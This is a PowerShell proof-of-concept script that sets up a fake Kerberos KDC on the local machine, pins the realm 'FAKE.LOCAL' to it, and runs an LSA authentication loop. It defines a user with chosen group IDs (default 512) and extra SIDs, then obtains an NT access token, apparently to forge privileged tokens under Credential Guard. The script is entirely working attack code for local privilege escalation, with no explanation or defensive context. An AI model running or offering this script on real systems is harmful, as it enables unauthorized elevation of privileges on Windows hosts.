# Pinned KDC (for cred guard)
param(
    [uint32[]]$GroupId = 512,
    [string[]]$ExtraSid = (Get-NtSid -IntegrityLevel Medium),
    [switch]$Format,
    [switch]$Limited
)

. "$PSScriptRoot\common.ps1"

$kdc = $null
try {
    $realm = "FAKE.LOCAL"
    $sid = Get-NtSid
    $username = (Get-NtSidName $sid).Name
    $password = "password"
    $user = New-KerberosKdcServerUser -Username $username -Password $password `
        -UserId $sid.SubAuthorities[-1] -GroupId $GroupId -ExtraSid $ExtraSid
    if ($Limited) {
        $re_ad = New-KerberosAuthorizationData -RestrictionFlag LimitedToken -IntegrityLevel Medium -MachineId (Get-MachineId)
        $if_ad = New-KerberosAuthorizationData -AuthorizationData $re_ad
        $user.AuthorizationData.Add($if_ad)
    }

    $kdc = New-KerberosKdcServer -Realm $realm -DomainSid $sid.Parent -User $user
    $kdc.Start()

    Add-KerberosKdcPin -Realm $realm -Hostname "127.0.0.1"
    $cred = Get-LsaCredential -UserName $username -Domain $realm -Password $password
    Use-NtObject($cred_handle = New-LsaCredentialHandle -Package 'Kerberos' -UseFlag Both -Credential $cred) {
        Use-NtObject($client = New-LsaClientContext -CredHandle $cred_handle -Target $username -RequestAttribute UseSessionKey) {
            Use-NtObject($server = New-LsaServerContext -CredHandle $cred_handle) {
                Update-LsaServerContext $server $client
                Update-LsaClientContext $client $server
                Update-LsaServerContext $server $client

                # Get NT access token.
                Get-LsaAccessToken $server
            }
        }
    }
} catch {
    Write-Error $_
} finally {
    Clear-KerberosKdcPin
    if ($kdc -ne $null) {
        $kdc.Stop()
    }
}